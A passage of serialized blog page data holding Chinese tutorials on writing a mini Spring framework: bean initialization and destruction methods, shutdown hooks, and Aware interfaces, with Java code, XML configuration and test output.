beandefinition.getinitmethodname();\n        if (strutil.isnotblank(initmethodname)) {\n            method initmethod = beandefinition.getbeanclass().getmethod(initmethodname);\n            if (initmethod == null) {\n                throw new beansexception("could not found an init method name: " + initmethodname);\n            }\n            initmethod.invoke(bean);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n    \n    主要实现了 invokeinitmethods() 这个核心方法。\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改 abstractautowirecapablebeanfactory，在 bean 实例化及属性填充后，加入初始化方法的调用：\n    \n    /**\n     * 创建 bean\n     */\n    @override\n    protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n        object bean = null;\n        try {\n            // 实例化\n            bean = createbeaninstance(beanname, beandefinition, args);\n            // 属性填充\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 添加 bean 的初始化扩展\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("failed to bean instance", e);\n        }\n        addsingleton(beanname, bean);\n        return bean;\n    }\n    \n    private object initializebean(string beanname, object bean, beandefinition beandefinition) {\n        // 前置处理\n        object wrappedbean = applybeanpostprocessorsbeforeinitialization(bean, beanname);\n        // ** 在这个一步，调用上面实现的初始化方法 **\n        try {\n            invokeinitmethods(beanname, wrappedbean, beandefinition);\n        } catch (invocationtargetexception | illegalaccessexception | nosuchmethodexception e) {\n            throw new beansexception("failed to bean init", e);\n        }\n        // 后置处理\n        wrappedbean = applybeanpostprocessorsafterinitialization(wrappedbean, beanname);\n        return wrappedbean;\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    \n    \n    这样就把初始化加入到了 bean 的创建中。\n\n\n# 销毁方法实现\n\n销毁方法的调用比较特殊，在 spring 容器关闭时，会触发销毁所有 bean 的过程。\n\n销毁方法的配置方式：\n\n 1. 跟初始化方法一样，可以在 xml 中配置 destroy-method 方法。\n 2. 为了更好的扩展，我们可以定义接口，只要一个 bean 实现了相应的初始化或销毁接口，就可以在容器中自动调用相应的实现方法。\n 3. 注解方式，我们现在赞不讨论。\n\n\n# 定义一些职责和能力：\n\n 1. initializingbean ：如果 bean 实现了 initializingbean 接口，容器会调用它的 afterpropertiesset() 方法，完成 bean 的初始化。如果 bean 没有实现 initializingbean 接口，容器会调用配置文件中指定的初始化方法（如果有）。\n\n 2. disposablebean：如果 bean 实现了 disposablebean 接口，容器会调用它的 destroy() 方法，完成 bean 的销毁。如果 bean 没有实现 disposablebean 接口，容器会调用配置文件中指定的销毁方法（如果有）。\n\n 3. singletonbeanregistry：之前已经提供过获取一个单例 bean 的能力。这里再加上\n    \n    注册待销毁的单例对象的能力：void registerdisposablebean(string beanname, disposablebean bean);\n    \n    销毁所有单例 bean 的能力：void destroysingletons();。\n\n 4. configurableapplicationcontext\n    \n    extendsapplicationcontext\n    \n    configurableapplicationcontext是spring框架中applicationcontext接口的一个扩展接口，它提供了一些额外的方法，例如refresh()：刷新容器，registershutdownhook()：注册关闭钩子函数，和close()：关闭函数，用于配置和管理应用程序上下文的生命周期和属性。\n\n\n# 具体的实现：\n\n 1. disposablebeanadapter：实现了 disposablebean 接口，并将其委托给一个实际的bean实例来执行销毁操作。这个适配类的出现主要是为了解决在虚拟机关闭的时候不想关注到底是哪种（xml或接口或注解）方式的销毁，由此出现这个适配类。\n    \n    public class dispoablebeanadapter implements disposablebean {\n    \n        private final object bean;\n        private final string beanname;\n        private final string destroymethodname;\n    \n        public dispoablebeanadapter(object bean, string beanname, beandefinition beandefinition) {\n            this.bean = bean;\n            this.beanname = beanname;\n            this.destroymethodname = beandefinition.getdestroymethodname();\n        }\n    \n        @override\n        public void destroy() throws nosuchmethodexception, invocationtargetexception, illegalaccessexception {\n            // 1. 实现接口的方式调用\n            if (bean instanceof disposablebean) {\n                ((disposablebean) bean).destroy();\n            }\n            // 2. xml 方式反射调用初始化方法\n            if (strutil.isnotblank(destroymethodname) && !(bean instanceof disposablebean)) {\n                method destroymethod = bean.getclass().getmethod(destroymethodname);\n                if (destroymethod == null) {\n                    throw new beansexception("could not found an init method name: " + destroymethodname);\n                }\n                destroymethod.invoke(bean);\n            }\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    \n\n 2. defaultsingletonbeanregistry\n    \n    implements singletonbeanregistry\n    \n    主要实现 registerdisposablebean(string beanname, disposablebean bean); 和 void destroysingletons();\n    \n    public class defaultsingletonbeanregistry implements singletonbeanregistry {\n    \n        private final map<string, object> singletonobjects = new hashmap<>();\n    \n        private final map<string, disposablebean> disposablebeans = new hashmap<>();\n    \n        @override\n        public object getsingleton(string beanname) {\n            return singletonobjects.get(beanname);\n        }\n    \n        protected void addsingleton(string beanname, object singletonobject) {\n            singletonobjects.put(beanname, singletonobject);\n        }\n    \n        @override\n        public void registerdisposablebean(string beanname, disposablebean bean) {\n            disposablebeans.put(beanname, bean);\n        }\n    \n        @override\n        public void destroysingletons() {\n            set<string> keyset = disposablebeans.keyset();\n            object[] disposablebeannames = keyset.toarray();\n            for (int i = disposablebeannames.length - 1; i >= 0; i--) {\n                object beanname = disposablebeannames[i];\n                disposablebean disposablebean = disposablebeans.remove(beanname);\n                try {\n                    disposablebean.destroy();\n                } catch (nosuchmethodexception | invocationtargetexception | illegalaccessexception e) {\n                    throw new beansexception("failed to bean:[" + beanname + "] destroy", e);\n                }\n            }\n    \n        }\n        \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    \n\n 3. 在 abstractautowirecapablebeanfactory\n    \n    extends abstractbeanfactory （它又 extends defaultsingletonbeanregistry，已经具备了注册待销毁的bean的能力）\n    \n    implements autowirecapablebeanfactory\n    \n    bean实例化、属性填充、初始化（bean的前后置处理）之后，注册所有实现了 disposablebean 接口的 bean 对象，留待容器停止的时候调用。\n    \n        protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n            object bean = null;\n            try {\n                // 实例化\n                bean = createbeaninstance(beanname, beandefinition, args);\n                // 属性填充\n                applypropertyvalues(beanname, bean, beandefinition);\n                // 添加 bean 的初始化扩展\n                bean = initializebean(beanname, bean, beandefinition);\n            } catch (exception e) {\n                throw new beansexception("failed to bean instance", e);\n            }\n            // 注册所有实现了 disposablebean 接口的 bean 对象，留待容器停止的时候调用。\n            registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n            // 添加单例 bean 缓存\n            addsingleton(beanname, bean);\n            return bean;\n        }\n    \n        protected void registerdisposablebeanifnecessary(string beanname, object bean, beandefinition beandefinition) {\n            if (bean instanceof disposablebean || strutil.isnotblank(beandefinition.getdestroymethodname())) {\n                registerdisposablebean(beanname, new dispoablebeanadapter(bean, beanname, beandefinition));\n            }\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n    \n    主要实现了 registerdisposablebeanifnecessary() 这个方法。\n\n 4. abstractapplicationcontext\n    \n    extends defaultresourceloader\n    \n    implements configurableapplicationcontext （需要实现注册虚拟机关闭钩子函数和关闭容器的方法）\n    \n        /** refresh()在之前已经实现 */\n    \t@override\n        public void refresh() {\n            // 1. 创建 bean 工厂，加载 beandefinition\n            refreshbeanfactory();\n    \n            // 2. 获得 bean 工厂\n            configurablelistablebeanfactory beanfactory = getbeanfactory();\n    \n            // 3. beandefinition 扩展点：\n            // spring 容器中 beandefinition 的扩展点。\n            // 创建 beandefinition 之后，但在创建 bean 实例之前。\n            invokebeanfactorypostprocessors(beanfactory);\n    \n            // 4. bean 扩展点：\n            // 提前注册所有的 beanpostprocessor，在 bean 创建后，初始化时扩展\n            // （见 abstractautowirecapablebeanfactory.createbean ）。\n            registerbeanpostprocessors(beanfactory);\n    \n            // 5. 提前实例化所有的单例 bean\n            beanfactory.preinstantiatesingletons();\n        }\n    \n        @override\n        public void registershutdownhook() {\n            runtime.getruntime().addshutdownhook(new thread(this::close));\n        }\n    \n        @override\n        public void close() {\n            getbeanfactory().destroysingletons();\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n\n# 将实现加入原有的逻辑中：\n\n 1. 总结就是先定义了两个接口 initializingbean 和 disposablebean，实现他们就具备了相应的能力。\n 2. 在 创建 bean 的时候调用所有初始化方法。\n 3. 因为虚拟机关闭时不想关系具体销毁的实现，所有加了个 disposablebean 包装所有的销毁方式。\n 4. bean 工厂得具备销毁的能力，所以得有注册和销毁的方法。在 singletonbeanregistry 定义：注册所有的待销毁实例+销毁所有可销毁的bean（就是看有没有实现disposablebean接口或xml指定销毁方法，有就提前存起来），而 defaultsingletonbeanregistry 就是对这两个能力的实现。\n 5. 容器得具备销毁的能力（实际就是调用 bean 工厂的销毁），在 configurableapplicationcontext 定义了 refresh()：刷新容器，registershutdownhook()：注册关闭钩子函数，和close()：关闭函数。而 abstractapplicationcontext 就是对它的实现（调用 bean 工厂的销毁方法）。\n\n\n# 测试：\n\n * xml 准备，这里 cat 采用 xml 的方式实现 init 和 destroy。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    <bean id="cat" name="catbean" init-method="init" destroy-method="destroy"\n          class="com.snail.springframework.beans.factory.support.cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n    <bean id="dog" class="com.snail.springframework.beans.factory.support.dog">\n        <property name="name" value="dog-name-xml-init"></property>\n        <property name="cat" ref="cat"></property>\n    </bean>\n\n    \x3c!--  添加扩展点相关类  --\x3e\n    <bean class="com.snail.springframework.beans.factory.support.catbeanpostprocessor"/>\n    <bean class="com.snail.springframework.beans.factory.support.dogbeanfactorypostprocessor"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * dog 准备，实现接口的方式\n\npublic class dog implements initializingbean, disposablebean {\n\n    private string name;\n\n    private cat cat;\n\n    private static map<string, object> initmap = new hashmap<>();\n\n    static {\n        initmap.put("inner-dog1", "tomdog");\n        initmap.put("inner-dog2", "jerrydog");\n    }\n\n    @override\n    public void afterpropertiedset() {\n        system.out.println("-- dog afterpropertiedset method by xml --");\n    }\n\n    @override\n    public void destroy() throws nosuchmethodexception, invocationtargetexception, illegalaccessexception {\n        system.out.println("-- dog destroy method by xml --");\n    }\n\n    public void printname() {\n        system.out.println(this.name);\n        system.out.println(this.cat);\n        system.out.println(initmap);\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public cat getcat() {\n        return cat;\n    }\n\n    public void setcat(cat cat) {\n        this.cat = cat;\n    }\n\n    @override\n    public string tostring() {\n        return "dog{" +\n                "name=\'" + name + \'\\\'\' +\n                ", cat=" + cat +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n * 测试类\n\n    @test\n    public void test_xml_context_close() {\n        // 1. 利用 xml上下文 加载bean\n        // 上下文的高级实现极大的简化了或融合了上述的 1-4 步操作\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring.xml");\n        // * 可以提前注册 jvm 关闭钩子，用来确保 spring 容器在 jvm 关闭之前正确地关闭并释放所有资源。\n        applicationcontext.registershutdownhook();\n        // 2. 获取bean\n        dog dog = (dog) applicationcontext.getbean("dog");\n\n        string[] beandefinitionnames = applicationcontext.getbeandefinitionnames();\n        system.out.println();\n        system.out.println(jsonutil.tojsonstr(beandefinitionnames));\n        system.out.println();\n        dog.printname();\n        // * close 和 registershutdownhook 比，比较暴力，直接手动调用关闭\n        // applicationcontext.close();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * 测试结果\n\n进入到 beandefinition 扩展点 beanfactorypostprocessor -> postprocessbeanfactory\nbeanname：dog 属性：name，原先值：dog-name-xml-init 修改后值：dog-beandefinition-updated\n\nbeanname：cat 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization\n-- cat init method by xml --\nbeanname：cat 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization\nbeanname：dog 进入到 bean 扩展点 beanpostprocessor -> postprocessbeforeinitialization\n-- dog afterpropertiedset method by interface --\nbeanname：dog 进入到 bean 扩展点 beanpostprocessor -> postprocessafterinitialization\n\n["cat","catbeanpostprocessor","dog","dogbeanfactorypostprocessor"]\n\ndog-beandefinition-updated\ncat{name=\'postprocessbeforeinitialization name cat\'}\n{inner-dog2=jerrydog, inner-dog1=tomdog}\n-- dog destroy method by interface --\n-- cat destroy method by xml --\n\nprocess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 总结\n\nspring bean 的初始化和销毁是指在 spring 容器管理下的 bean 对象在被实例化和使用前、以及在容器关闭时，分别会执行一些特定的方法，以完成一些必要的操作。下面是关于 spring bean 初始化和销毁的总结：\n\n 1. 初始化方法：\n\n在 spring 容器创建 bean 时，可以通过指定一些特定的初始化方法来对 bean 进行初始化。spring 提供了以下三种方式：\n\n * 通过实现 initializingbean 接口来自定义初始化方法；\n * 通过在bean配置文件中定义 init-method 属性来指定初始化方法；\n * 通过 @postconstruct 注解来定义初始化方法。\n\n 1. 销毁方法：\n\n在 spring 容器关闭时，需要对一些资源进行清理或释放，这时可以通过指定一些特定的销毁方法来完成。spring 提供了以下两种方式：\n\n * 通过实现 disposablebean 接口来自定义销毁方法；\n * 通过在bean配置文件中定义 destroy-method 属性来指定销毁方法。\n\n需要注意的是，只有当 bean 被 spring 容器管理时，才能够执行初始化和销毁方法。如果 bean 不是由 spring 容器管理，则不会执行初始化和销毁方法。\n\n此外，spring 还提供了一种通过 java 注解来管理 bean 的生命周期的方式，即通过 @predestroy 注解来定义bean的作用域和销毁方法。\n\n总之，spring bean 的初始化和销毁方法可以通过实现特定接口、指定特定属性或使用注解来实现。在实际应用中，需要根据具体的业务需求和场景来选择合适的方式来管理bean的生命周期。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 06 - Aware扩展，感知容器各个组件",frontmatter:{title:"手写 Spring 06 - Aware扩展，感知容器各个组件",date:"2023-04-19T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-06.html",relativePath:"views/backend/spring-source-06.md",key:"v-5ddc9d18",path:"/views/backend/spring-source-06.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:338},{level:2,title:"容器 Aware 实现",slug:"容器-aware-实现",normalizedTitle:"容器 aware 实现",charIndex:344},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:361},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:377},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:389},{level:2,title:"上下文 Aware 实现",slug:"上下文-aware-实现",normalizedTitle:"上下文 aware 实现",charIndex:405},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力：",charIndex:361},{level:3,title:"具体的实现：",slug:"具体的实现-2",normalizedTitle:"具体的实现：",charIndex:377},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:389},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:469},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:476}],excerpt:"<Boxx/>\n<p>Spring Aware 接口是一个标记接口，实现该接口的 Bean 可以访问 Spring 的核心组件 ApplicationContext 或其他特定的 Spring 框架对象。</p>\n<p>这些组件包括 BeanFactory、ResourceLoader、ApplicationEventPublisher 等等。</p>\n<p>实现该接口的 bean 需要实现 setApplicationContext() 方法，并在该方法中将 ApplicationContext 或其他 Spring 框架对象注入到该 bean 中。通过实现 Spring Aware 接口，bean 可以获取 Spring 容器中的其他 bean 和资源，从而更好地利用 Spring 框架的功能。</p>\n",headersStr:"解析 容器 Aware 实现 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 上下文 Aware 实现 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 总结",content:'Spring Aware 接口是一个标记接口，实现该接口的 Bean 可以访问 Spring 的核心组件 ApplicationContext 或其他特定的 Spring 框架对象。\n\n这些组件包括 BeanFactory、ResourceLoader、ApplicationEventPublisher 等等。\n\n实现该接口的 bean 需要实现 setApplicationContext() 方法，并在该方法中将 ApplicationContext 或其他 Spring 框架对象注入到该 bean 中。通过实现 Spring Aware 接口，bean 可以获取 Spring 容器中的其他 bean 和资源，从而更好地利用 Spring 框架的功能。\n\n\n\n * 解析\n * 容器 Aware 实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n * 上下文 Aware 实现\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\nSpring Aware 接口有多个子接口，分别对应不同的 Spring 框架对象和功能。比如：\n\n 1. BeanNameAware：实现该接口的 bean 可以获取自己在容器中的 Bean 名称。\n\n 2. BeanFactoryAware：实现该接口的 bean 可以获取 BeanFactory（即Spring容器）对象。\n\n 3. ApplicationContextAware：实现该接口的 bean 可以获取 ApplicationContext 对象，从而可以访问 Spring 容器中的其他 bean、资源和配置信息。\n\n 4. MessageSourceAware：实现该接口的 bean 可以获取 MessageSource 对象，用于国际化处理。\n\n 5. ApplicationEventPublisherAware：实现该接口的 bean 可以获取 ApplicationEventPublisher 对象，用于发布应用程序事件。\n\n 6. ResourceLoaderAware：实现该接口的 bean 可以获取 ResourceLoader 对象，用于加载外部资源文件。\n\n通过实现这些 Spring Aware 接口，bean 可以更加灵活地使用 Spring 框架提供的各种功能和资源，同时也增强了与 Spring 框架的集成能力。\n\n\n# 解析\n\nAware 是如何在 Spring 中实现的呢：在 Spring 中，Aware 接口的实现是通过 BeanPostProcessor 机制来实现的。\n\n当 Spring 容器创建一个 bean 时，会在 bean 的生命周期中调用 BeanPostProcessor 接口中的两个方法 postProcessBeforeInitialization() 和 postProcessAfterInitialization() 。如果一个 bean 实现了某个 Aware 接口， BeanPostProcessor 会检测到该 bean，并调用对应的 setXxx() 方法来注入相应的 Spring 组件。\n\n比如，实现 ApplicationContextAware 接口的 bean，在 postProcessBeforeInitialization() 方法中会调用其 setApplicationContext() 方法，并将 ApplicationContext 对象注入到该 bean 中。由于 Aware 接口是标记接口，因此在 Spring 容器中没有具体的实现类，而是通过 Java 反射机制在运行时动态地为 bean 生成代理类来实现注入操作。\n\n需要注意的是，Aware 接口的实现顺序是非常重要的。如果多个 bean 都实现了同一个 Aware 接口，Spring 会按照某种预定义的顺序依次调用它们的 setXxx() 方法。因此，如果存在顺序依赖关系，就需要设置合适的优先级，确保 bean 的注入顺序正确。可以使用 @Order 注解或实现 Ordered 接口来指定 Aware 接口的执行顺序。\n\n\n# 容器 Aware 实现\n\nSpring 中的 Aware 实现流程可以分为以下几步：\n\n 1. 定义 Aware 接口：在自定义的类中定义一个实现了某个 Aware 接口的方法，如 ApplicationContextAware 接口。\n\n 2. 注册 BeanPostProcessor：在 Spring 容器启动时注册 BeanPostProcessor 实现类，该实现类会对所有 Bean 进行处理，判断是否实现了指定的 Aware 接口。如果实现了，则调用相应的方法。\n\n 3. 查找并注入相关 Bean：当一个 Bean 实现了指定的 Aware 接口后，在其初始化过程中，Spring 会自动查找相应的 Bean，并将其注入到该 Bean 中。\n\n 4. 使用注入的 Bean：在 Bean 初始化完成后，可通过注入的 Bean 来获取相应的资源，如 ApplicationContext、BeanFactory 等。\n\n需要注意的是，具体实现方式会因为实现的 Aware 接口不同而有所差异，例如实现了 BeanNameAware 接口则可获得当前 Bean 的名称等。\n\n\n# 定义一些职责和能力：\n\n 1. Aware\n    \n    /**\n     * Spring Aware 接口是一个标记接口，实现该接口的 Bean 可以访问 Spring 的核心组件 ApplicationContext 或其他特定的 Spring 框架对象。\n     * 通过实现 Spring Aware 接口，bean 可以获取 Spring 容器中的其他 bean 和资源，从而更好地利用 Spring 框架的功能。\n     */\n    public interface Aware {\n        \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 2. BeanNameAware\n    \n    /**\n     * 实现该接口的 bean 可以获取 所属 Bean 在容器中的名称。\n     */\n    public interface BeanNameAware extends Aware {\n    \n        /**\n         * 感知 bean 名称\n         *\n         * @param beanName bean名字\n         */\n        void setBeanName(String beanName);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n 3. BeanFactoryAware\n    \n    /**\n     * 实现该接口的 bean 可以获取 BeanFactory（即Spring容器）对象。\n     */\n    public interface BeanFactoryAware extends Aware {\n    \n        /**\n         * 感知 BeanFactory（即Spring容器）对象\n         *\n         * @param beanFactory bean工厂\n         */\n        void setBeanFactory(BeanFactory beanFactory);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n 4. BeanClassLoaderAware\n    \n    /**\n     * 实现该接口的 bean 可以获取 所属 ClassLoader 对象。\n     *\n     * @author zhangpengjun\n     * @date 2023/3/28\n     */\n    public interface BeanClassLoaderAware extends Aware {\n    \n        /**\n         * 感知 所属 ClassLoader 对象\n         *\n         * @param classLoader 类装入器\n         */\n        void setBeanClassLoader(ClassLoader classLoader);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n\n# 具体的实现：\n\n * 无\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改 AbstractAutowireCapableBeanFactory，在 Bean 实例化及属性填充后，初始化方法的调用的过程中加入 Aware 感知的能力：\n    \n        private Object initializeBean(String beanName, Object bean, BeanDefinition beanDefinition) {\n            // 感知类型扩展 处理\n            if (bean instanceof Aware) {\n                if (bean instanceof BeanNameAware) {\n                    ((BeanNameAware) bean).setBeanName(beanName);\n                }\n                if (bean instanceof BeanClassLoaderAware) {\n                    ((BeanClassLoaderAware) bean).setBeanClassLoader(getBeanClassLoader());\n                }\n                if (bean instanceof BeanFactoryAware) {\n                    ((BeanFactoryAware) bean).setBeanFactory(this);\n                }\n            }\n            // BeanPostProcessor 前置处理，ApplicationContextAwareProcessor 也会在这里处理\n            Object wrappedBean = applyBeanPostProcessorsBeforeInitialization(bean, beanName);\n            // 调用初始化方法\n            try {\n                invokeInitMethods(beanName, wrappedBean, beanDefinition);\n            } catch (InvocationTargetException | IllegalAccessException | NoSuchMethodException e) {\n                throw new BeansException("Failed to bean init", e);\n            }\n            // BeanPostProcessor 后置处理\n            wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);\n            return wrappedBean;\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n    \n    这样就把容器 Aware 能力加入到了 Bean 的创建中。\n\n\n# 上下文 Aware 实现\n\n我们在 Spring 中对 ApplicationContextAware 接口的实现可以概括为以下几个步骤：\n\n 1. Spring 容器创建 ApplicationContextAware 实例对象。\n\n 2. Spring 容器检测到该实例对象实现了 ApplicationContextAware 接口。\n\n 3. Spring 容器将当前容器的 ApplicationContext 对象注入到该实例对象的 setApplicationContext() 方法中。\n\n 4. 实现 ApplicationContextAware 接口的 bean 可以在 setApplicationContext() 方法中获取 ApplicationContext 对象，从而访问容器中的其他 bean。\n\n需要注意的是，实现原理是通过 BeanPostProcessor 来实现的，其中 ApplicationContextAwareProcessor 就是一个内置的 BeanPostProcessor，它会在初始化 bean 的过程中，检测是否实现了 ApplicationContextAware 接口，并在合适的时候（容器启动，在 Bean 创建时的前置处理器中）调用 setApplicationContext() 方法完成注入操作。因此，如果我们需要自定义 Aware 类型接口的注入逻辑，也可以通过实现自己的 BeanPostProcessor 来实现。\n\n\n# 定义一些职责和能力：\n\n 1. ApplicationContextAware：感知应用程序上下文\n    \n    /**\n     * 感知 应用程序上下文\n     *\n     * @author zhangpengjun\n     * @date 2023/3/28\n     */\n    public interface ApplicationContextAware extends Aware {\n    \n        /**\n         * 设置应用程序上下文\n         *\n         * @param applicationContext 应用程序上下文\n         */\n        void setApplicationContext(ApplicationContext applicationContext);\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n\n# 具体的实现：\n\n 1. ApplicationContextAwareProcessor：是一个处理器（BeanPostProcessor），用于在 Spring 容器创建 bean 实例后，对实现了 ApplicationContextAware 接口的 bean 进行特殊处理。\n    \n    /**\n     * 应用程序上下文Aware比较特殊，因为在容器直接创建 Bean 的时候没有上下文的存在，\n     * 所以只能交由上下文refresh()的时候，将 ApplicationContextAware 包装作为一个 Bean 的后置处理器添加到容器中，\n     * 然后在Bean创建的时候，应用Bean前置处理，将上下文设置到Bean中取。\n     * <p>\n     * 所以：ApplicationContextAware 底层是 通过 BeanPostProcessor 实现的。\n     */\n    public class ApplicationContextAwareProcessor implements BeanPostProcessor {\n    \n        private final ApplicationContext applicationContext;\n    \n        public ApplicationContextAwareProcessor(ApplicationContext applicationContext) {\n            this.applicationContext = applicationContext;\n        }\n    \n        @Override\n        public Object postProcessBeforeInitialization(Object bean, String beanName) {\n            if (bean instanceof ApplicationContextAware) {\n                ((ApplicationContextAware) bean).setApplicationContext(applicationContext);\n            }\n            return bean;\n        }\n    \n        @Override\n        public Object postProcessAfterInitialization(Object bean, String beanName) {\n            return bean;\n        }\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    \n\n具体来说，ApplicationContextAwareProcessor 会在以下两个时刻进行处理：\n\n 1. 在 bean 实例化后，但在初始化前：此时 ApplicationContextAwareProcessor 会查找所有实现了 ApplicationContextAware 接口的 bean，并调用它们的 setApplicationContext() 方法，将 ApplicationContext 注入进去。\n 2. 在 bean 初始化后：此时 ApplicationContextAwareProcessor 不会再对 ApplicationContextAware 类型的 bean 进行处理，而是继续对其他类型的 bean 进行后续的处理。\n\n该处理器会检查每个 bean 是否实现了 ApplicationContextAware 接口，如果实现了，则将 ApplicationContext 容器注入到该 bean 的 setApplicationContext() 方法中，从而使得该 bean 可以访问容器中的其他 bean。\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改上下文 AbstractApplicationContext 的 refresh() 方法：\n    \n        @Override\n        public void refresh() {\n            // 1. 创建 Bean 工厂，加载 BeanDefinition\n            refreshBeanFactory();\n    \n            // 2. 获得 Bean 工厂\n            ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n            // 2.1 == 这里新加这一步 ==\n            // 添加 ApplicationContextAware 的后置处理器\n            // 使 Bean 创建时（BeanPostProcessor前置处理器）的时候可以感知到容器上下文\n            beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(this));\n    \n            // 3. BeanDefinition 扩展点：\n            // Spring 容器中 BeanDefinition 的扩展点。\n            // 创建 BeanDefinition 之后，但在创建 Bean 实例之前。\n            invokeBeanFactoryPostProcessors(beanFactory);\n    \n            // 4. Bean 扩展点：\n            // 提前注册所有的 BeanPostProcessor，在 Bean 创建后，初始化时扩展\n            // （见 AbstractAutowireCapableBeanFactory.createBean ）。\n            registerBeanPostProcessors(beanFactory);\n    \n            // 5. 提前实例化所有的单例 Bean\n            beanFactory.preInstantiateSingletons();\n        }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n\n\n# 测试：\n\n * xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    <bean id="mouse" class="com.snail.springframework.beans.factory.support.Mouse">\n        <property name="name" value="name-xml-init-jerry"></property>\n    